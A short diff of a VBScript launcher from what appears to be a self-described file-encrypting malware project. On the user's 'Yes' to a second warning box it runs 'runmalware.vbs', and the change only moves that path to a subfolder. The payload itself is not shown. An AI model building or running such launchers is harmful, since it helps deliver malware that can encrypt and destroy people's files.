@@ -7,7 +7,7 @@ warn2 = MsgBox("SECOND WARNING (for avoiding misclick): This malware can encrypt
   If warn2 = vbYes Then
 set shell = createobject("wscript.shell")
 set fso = createobject("scripting.filesystemobject")
-shell.run fso.getparentfoldername(wscript.scriptfullname) & "\runmalware.vbs"
+shell.run fso.getparentfoldername(wscript.scriptfullname) & "\run\runmalware.vbs"
 elseif warn2 = vbNo Then
     WScript.Quit
 end if
